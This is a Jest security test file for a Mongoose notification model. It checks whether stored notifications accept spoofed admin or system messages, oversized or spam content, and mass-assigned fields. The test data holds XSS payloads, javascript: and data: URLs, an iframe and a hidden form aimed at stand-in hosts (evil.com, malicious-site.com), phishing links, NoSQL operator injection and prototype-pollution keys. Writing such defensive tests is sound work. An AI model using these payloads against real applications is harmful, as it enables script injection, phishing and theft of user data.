import mongoose from 'mongoose';
import { Notification, NotificationDocument } from '../../models/Notification';
import { User } from '../../models/User';

describe('Notification Model Security Tests', () => {
  let testUserId: mongoose.Types.ObjectId;
  let adminUserId: mongoose.Types.ObjectId;

  beforeAll(async () => {
    await mongoose.connect(process.env.MONGODB_TEST_URI || 'mongodb://localhost:27017/test');
  });

  afterAll(async () => {
    await mongoose.connection.close();
  });

  beforeEach(async () => {
    await Notification.deleteMany({});
    await User.deleteMany({});
    
    const user = await User.create({
      firstName: 'Test', lastName: 'User', gender: 'male',
      phoneNumber: '1234567890', password: 'password123',
      email: 'test@example.com', for_Profile: 'myself'
    });
    
    const admin = await User.create({
      firstName: 'Admin', lastName: 'User', gender: 'male',
      phoneNumber: '0987654321', password: 'adminpass',
      email: 'admin@example.com', role: 'admin', for_Profile: 'myself'
    });
    
    testUserId = user._id;
    adminUserId = admin._id;
  });

  describe('Privilege Escalation Attacks', () => {
    test('should prevent unauthorized admin message creation', async () => {
      const adminMessageData = {
        user: testUserId,
        type: 'admin_message',
        title: 'Fake Admin Message',
        message: 'This is a fake admin message from a regular user',
        meta: { isOfficial: true }
      };

      const notification = await Notification.create(adminMessageData);
      
      // Regular users shouldn't create admin messages
      if (notification.type === 'admin_message') {
        console.warn('PRIVILEGE ESCALATION VULNERABILITY: Regular users can create admin messages');
      }
    });

    test('should prevent system notification spoofing', async () => {
      const systemMessageData = {
        user: testUserId,
        type: 'system',
        title: 'System Alert: Your account will be deleted',
        message: 'Click here to verify your account: http://malicious-site.com',
        meta: { urgent: true, fromSystem: true }
      };

      const notification = await Notification.create(systemMessageData);
      
      if (notification.type === 'system') {
        console.warn('SECURITY VULNERABILITY: Users can create fake system notifications');
      }
    });

    test('should validate notification source authorization', async () => {
      const unauthorizedNotificationData = {
        user: testUserId,
        type: 'admin_message',
        title: 'Account Suspension Notice',
        message: 'Your account has been suspended. Pay $100 to reactivate.',
        meta: { 
          sender: adminUserId, // Spoofing admin as sender
          priority: 'high',
          official: true 
        }
      };

      const notification = await Notification.create(unauthorizedNotificationData);
      
      if (notification.meta && notification.meta.sender && notification.meta.sender.equals(adminUserId)) {
        console.warn('SECURITY VULNERABILITY: Admin identity can be spoofed in notifications');
      }
    });
  });

  describe('Message Content Injection', () => {
    test('should prevent XSS in notification content', async () => {
      const xssNotificationData = {
        user: testUserId,
        type: 'like',
        title: '<script>alert("XSS in title")</script>',
        message: '<img src=x onerror=alert("XSS in message")>Someone liked your profile',
        meta: { 
          maliciousScript: '<svg onload=alert("XSS in meta")>',
          payload: 'javascript:alert("JS Protocol")'
        }
      };

      const notification = await Notification.create(xssNotificationData);
      
      if (notification.title.includes('<script>')) {
        console.warn('CRITICAL XSS VULNERABILITY: Script injection in notification title');
      }
      
      if (notification.message.includes('<img') && notification.message.includes('onerror')) {
        console.warn('CRITICAL XSS VULNERABILITY: XSS vector in notification message');
      }
      
      if (notification.meta && notification.meta.maliciousScript && notification.meta.maliciousScript.includes('<svg')) {
        console.warn('CRITICAL XSS VULNERABILITY: Script injection in notification metadata');
      }
    });

    test('should prevent HTML injection in notifications', async () => {
      const htmlInjectionData = {
        user: testUserId,
        type: 'profile_view',
        title: 'Profile <h1>HACKED</h1> View',
        message: '<iframe src="http://malicious-site.com"></iframe>Your profile was viewed',
        meta: { 
          styling: '<style>body{display:none;}</style>',
          content: '<form action="http://evil.com"><input type="hidden" value="steal data"></form>'
        }
      };

      const notification = await Notification.create(htmlInjectionData);
      
      if (notification.message.includes('<iframe')) {
        console.warn('SECURITY VULNERABILITY: HTML iframe injection in notifications');
      }
      
      if (notification.meta && notification.meta.styling && notification.meta.styling.includes('<style>')) {
        console.warn('SECURITY VULNERABILITY: CSS injection in notification metadata');
      }
    });

    test('should prevent URL injection and phishing attempts', async () => {
      const phishingNotificationData = {
        user: testUserId,
        type: 'request_received',
        title: 'Connection Request',
        message: 'Click here to verify: http://fake-matrimony-site.com/verify?token=steal_credentials',
        meta: { 
          actionUrl: 'javascript:window.location="http://malicious-site.com"',
          redirectTo: 'data:text/html,<script>steal_data()</script>',
          verificationLink: 'http://evil.com/phish?target=' + testUserId
        }
      };

      const notification = await Notification.create(phishingNotificationData);
      
      if (notification.message.includes('http://fake-matrimony-site.com')) {
        console.warn('PHISHING VULNERABILITY: Malicious URLs allowed in notification messages');
      }
      
      if (notification.meta && notification.meta.actionUrl && notification.meta.actionUrl.includes('javascript:')) {
        console.warn('SECURITY VULNERABILITY: JavaScript protocol in notification metadata');
      }
    });
  });

  describe('Data Injection and Meta Field Security', () => {
    test('should prevent NoSQL injection in meta fields', async () => {
      const nosqlInjectionData = {
        user: testUserId,
        type: 'like',
        title: 'Someone liked your profile',
        message: 'Check out who liked you',
        meta: {
          userId: { $ne: null }, // NoSQL injection
          query: { $where: 'function() { return true; }' }, // Function injection
          aggregation: [{ $match: {} }, { $lookup: { from: 'users', localField: '_id', foreignField: '_id', as: 'users' } }]
        }
      };

      const notification = await Notification.create(nosqlInjectionData);
      
      if (notification.meta && notification.meta.userId && typeof notification.meta.userId === 'object' && '$ne' in notification.meta.userId) {
        console.warn('CRITICAL VULNERABILITY: NoSQL injection in notification metadata');
      }
      
      if (notification.meta && notification.meta.query && typeof notification.meta.query === 'object' && '$where' in notification.meta.query) {
        console.warn('CRITICAL VULNERABILITY: Function injection in notification metadata');
      }
    });

    test('should prevent prototype pollution through meta fields', async () => {
      const pollutionData = {
        user: testUserId,
        type: 'system',
        title: 'System Notification',
        message: 'Important update',
        meta: {
          '__proto__': { isAdmin: true },
          'constructor': { 'prototype': { isAdmin: true } },
          'normal': 'data'
        }
      };

      const notification = await Notification.create(pollutionData);
      
      if (notification.meta && ('__proto__' in notification.meta || 'constructor' in notification.meta)) {
        console.warn('CRITICAL VULNERABILITY: Prototype pollution possible through notification metadata');
      }
    });

    test('should prevent deeply nested object injection in meta', async () => {
      const deepObject: any = { level1: { level2: { level3: { level4: { level5: 'deep injection' } } } } };
      
      // Add circular reference
      deepObject.level1.level2.circular = deepObject;

      const deepInjectionData = {
        user: testUserId,
        type: 'like',
        title: 'Like notification',
        message: 'Someone liked your profile',
        meta: deepObject
      };

      try {
        const notification = await Notification.create(deepInjectionData);
        if (notification.meta && notification.meta.level1 && notification.meta.level1.level2) {
          console.warn('SECURITY VULNERABILITY: Deep object nesting allowed in notification metadata');
        }
      } catch (error) {
        // If it fails due to circular reference, that's good
        expect(error).toBeDefined();
      }
    });
  });

  describe('Notification Type Validation Bypass', () => {
    test('should enforce notification type enum constraints', async () => {
      const invalidTypeData = {
        user: testUserId,
        type: 'malicious_type', // Not in enum
        title: 'Invalid notification',
        message: 'This should not be allowed'
      };

      await expect(Notification.create(invalidTypeData)).rejects.toThrow();
    });

    test('should prevent type confusion attacks', async () => {
      const typeConfusionData = {
        user: testUserId,
        type: ['admin_message', 'system'], // Array instead of string
        title: 'Confused type',
        message: 'Multiple types'
      };

      await expect(Notification.create(typeConfusionData)).rejects.toThrow();
    });

    test('should handle boolean injection in enum fields', async () => {
      const booleanInjectionData = {
        user: testUserId,
        type: true, // Boolean instead of string enum
        title: 'Boolean type',
        message: 'Invalid type'
      };

      await expect(Notification.create(booleanInjectionData)).rejects.toThrow();
    });
  });

  describe('Notification Spam and DoS Prevention', () => {
    test('should prevent notification spam attacks', async () => {
      const spamNotifications = Array(10000).fill(0).map((_, i) => ({
        user: testUserId,
        type: 'like',
        title: `Spam notification ${i}`,
        message: `This is spam message number ${i}`
      }));

      try {
        const notifications = await Notification.insertMany(spamNotifications);
        if (notifications.length === 10000) {
          console.warn('SECURITY VULNERABILITY: No rate limiting on notification creation - DoS possible');
        }
      } catch (error) {
        // If it fails due to size limits, that's good
        expect(error).toBeDefined();
      }
    });

    test('should prevent extremely large notification content', async () => {
      const hugeContent = 'A'.repeat(1000000); // 1MB of text
      
      const largeNotificationData = {
        user: testUserId,
        type: 'like',
        title: hugeContent,
        message: hugeContent,
        meta: { largeField: hugeContent }
      };

      try {
        const notification = await Notification.create(largeNotificationData);
        if (notification.title.length === 1000000) {
          console.warn('SECURITY VULNERABILITY: No size limits on notification content - DoS possible');
        }
      } catch (error) {
        expect(error).toBeDefined();
      }
    });
  });

  describe('Referential Integrity and Data Consistency', () => {
    test('should validate user references exist', async () => {
      const nonExistentUserId = new mongoose.Types.ObjectId();
      
      const notificationData = {
        user: nonExistentUserId,
        type: 'like',
        title: 'Test notification',
        message: 'Test message'
      };

      const notification = await Notification.create(notificationData);
      if (notification) {
        console.warn('SECURITY VULNERABILITY: No referential integrity check for user references');
      }
    });

    test('should handle orphaned notifications after user deletion', async () => {
      const notificationData = {
        user: testUserId,
        type: 'like',
        title: 'Test notification',
        message: 'This notification will be orphaned'
      };

      const notification = await Notification.create(notificationData);
      
      // Delete the user
      await User.findByIdAndDelete(testUserId);
      
      const orphanedNotification = await Notification.findById(notification._id);
      if (orphanedNotification) {
        console.warn('DATA INTEGRITY ISSUE: Orphaned notifications remain after user deletion');
      }
    });

    test('should validate notification count per user', async () => {
      // Create many notifications for one user
      const manyNotifications = Array(1000).fill(0).map((_, i) => ({
        user: testUserId,
        type: 'like',
        title: `Notification ${i}`,
        message: `Message ${i}`
      }));

      const notifications = await Notification.insertMany(manyNotifications);
      
      if (notifications.length === 1000) {
        console.warn('PERFORMANCE ISSUE: No limits on notifications per user');
      }
    });
  });

  describe('Privacy and Access Control', () => {
    test('should prevent cross-user notification access', async () => {
      const user2 = await User.create({
        firstName: 'User2', lastName: 'Test', gender: 'female',
        phoneNumber: '1111111111', password: 'password789',
        email: 'user2@example.com', for_Profile: 'myself'
      });

      const privateNotificationData = {
        user: testUserId,
        type: 'request_received',
        title: 'Private notification for user 1',
        message: 'This should only be visible to user 1',
        meta: { sensitiveData: 'confidential information' }
      };

      const notification = await Notification.create(privateNotificationData);
      
      // User 2 should not access user 1's notifications
      const crossAccessAttempt = await Notification.findOne({
        _id: notification._id,
        user: user2._id // Wrong user
      });
      
      if (!crossAccessAttempt) {
        // This is good - no cross access
      } else {
        console.warn('PRIVACY VULNERABILITY: Cross-user notification access possible');
      }
    });

    test('should handle read status manipulation', async () => {
      const notificationData = {
        user: testUserId,
        type: 'like',
        title: 'Test notification',
        message: 'Test message',
        isRead: true // Attempting to create as already read
      };

      const notification = await Notification.create(notificationData);
      
      // Notifications should default to unread
      if (notification.isRead === true) {
        console.warn('BUSINESS LOGIC ISSUE: Notifications can be created as already read');
      }
    });
  });

  describe('Mass Assignment Vulnerabilities', () => {
    test('should prevent unauthorized field manipulation', async () => {
      const maliciousData = {
        user: testUserId,
        type: 'like',
        title: 'Test notification',
        message: 'Test message',
        _id: new mongoose.Types.ObjectId(), // Custom ID
        __v: 999, // Version manipulation
        createdAt: new Date('2020-01-01'), // Backdated creation
        updatedAt: new Date('2020-01-01') // Backdated update
      };

      const notification = await Notification.create(maliciousData);
      
      if (notification.createdAt.getFullYear() === 2020) {
        console.warn('SECURITY VULNERABILITY: Mass assignment allows timestamp manipulation');
      }
    });
  });

  describe('Default Value Security', () => {
    test('should set secure default values', async () => {
      const minimalData = {
        user: testUserId,
        type: 'like',
        title: 'Test',
        message: 'Test message'
      };

      const notification = await Notification.create(minimalData);
      
      expect(notification.isRead).toBe(false); // Should default to unread
      expect(notification.meta).toBeUndefined(); // No meta by default
    });
  });
});